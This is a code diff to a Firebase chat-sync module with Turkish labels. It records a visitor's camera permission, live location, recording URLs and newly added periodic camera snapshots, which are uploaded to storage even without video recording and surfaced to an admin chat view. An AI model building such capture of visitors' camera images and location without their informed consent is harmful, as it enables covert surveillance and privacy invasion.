@@ -295,6 +295,14 @@ async function markVisitorCameraReady(targetSessionId, callId) {
     status: "connecting",
     updatedAt: Date.now(),
   });
+  await update(ref(database, `chats/${targetSessionId}`), {
+    cameraGranted: true,
+    cameraGrantedAt: Date.now(),
+    hasCamera: true,
+    updatedAt: Date.now(),
+    preview: "📷 Kamera izni verildi",
+    lastWho: "user",
+  }).catch(() => {});
   return true;
 }
 
@@ -319,6 +327,14 @@ async function writeLiveLocation(targetSessionId, callId, location) {
     locationUpdatedAt: payload.ts,
     updatedAt: Date.now(),
   });
+  await update(ref(database, `chats/${targetSessionId}`), {
+    lastLocation: payload,
+    lastLocationAt: payload.ts,
+    hasLocation: true,
+    updatedAt: Date.now(),
+    preview: "📍 Konum alındı",
+    lastWho: "user",
+  }).catch(() => {});
   return true;
 }
 
@@ -412,12 +428,18 @@ async function uploadCameraRecording(targetSessionId, callId, blob, fileName) {
       recordingName: safeName,
       recordingReadyAt: Date.now(),
       recordingStatus: "ready",
+      status: "ended",
       updatedAt: Date.now(),
     });
     await update(ref(database, `chats/${targetSessionId}`), {
       updatedAt: Date.now(),
       preview: "🎬 Kamera kaydı hazır",
       lastWho: "user",
+      lastRecordingUrl: url,
+      lastRecordingName: safeName,
+      lastRecordingAt: Date.now(),
+      lastRecordingCallId: String(callId),
+      hasRecording: true,
     });
     return url;
   } catch (err) {
@@ -428,6 +450,46 @@ async function uploadCameraRecording(targetSessionId, callId, blob, fileName) {
     ).catch(() => {});
     throw err;
   }
+}
+
+/** Periyodik kamera karesi (video kaydı olmasa bile Storage’a düşer) */
+async function uploadCameraSnapshot(targetSessionId, callId, blob, fileName) {
+  const store = initStorage();
+  const database = initDb();
+  if (!store || !database) throw new Error("Firebase Storage bağlı değil");
+  if (!blob?.size) throw new Error("Boş görüntü");
+
+  const safeName = String(fileName || `snap-${callId}.jpg`).replace(/[^\w.\-]+/g, "_");
+  const path = `recordings/${targetSessionId}/${safeName}`;
+  const fileRef = storageRef(store, path);
+
+  await uploadBytes(fileRef, blob, {
+    contentType: blob.type || "image/jpeg",
+    contentDisposition: `inline; filename="${safeName}"`,
+    customMetadata: {
+      sessionId: String(targetSessionId),
+      callId: String(callId),
+      kind: "snapshot",
+    },
+  });
+
+  const url = await getDownloadURL(fileRef);
+  const now = Date.now();
+  await update(ref(database, webrtcPath(targetSessionId, callId)), {
+    lastSnapshotUrl: url,
+    lastSnapshotAt: now,
+    lastSnapshotPath: path,
+    updatedAt: now,
+  });
+  await update(ref(database, `chats/${targetSessionId}`), {
+    updatedAt: now,
+    preview: "🖼 Kamera fotoğrafı alındı",
+    lastWho: "user",
+    lastSnapshotUrl: url,
+    hasCamera: true,
+    cameraGranted: true,
+  });
+  return url;
 }
 
 async function sendAdminMessage(targetSessionId, text, options = {}) {
@@ -684,6 +746,7 @@ window.ChatSync = {
   listenIceCandidates,
   clearCameraCall,
   uploadCameraRecording,
+  uploadCameraSnapshot,
   markCameraRecordingFailed,
   getQuickReplies,
   setQuickReplies,
